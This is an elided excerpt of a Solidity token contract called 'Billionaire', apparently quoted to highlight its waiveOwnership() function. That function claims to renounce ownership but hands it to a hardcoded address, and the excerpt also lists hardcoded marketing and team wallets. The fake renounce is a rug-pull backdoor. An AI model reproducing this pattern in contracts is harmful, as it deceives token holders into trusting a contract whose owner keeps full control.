...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x50D1FF6657f23a1644F3c61Ba35a85A764cAa524);
    }
...
contract Billionaire is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x800f5A1A1B92310E5ae33d8B8155405ACdeE2E51);
    address payable public teamWalletAddress = payable(0x2652fa8Aa22A7D8C232f461908F2aC91DEae94e6);
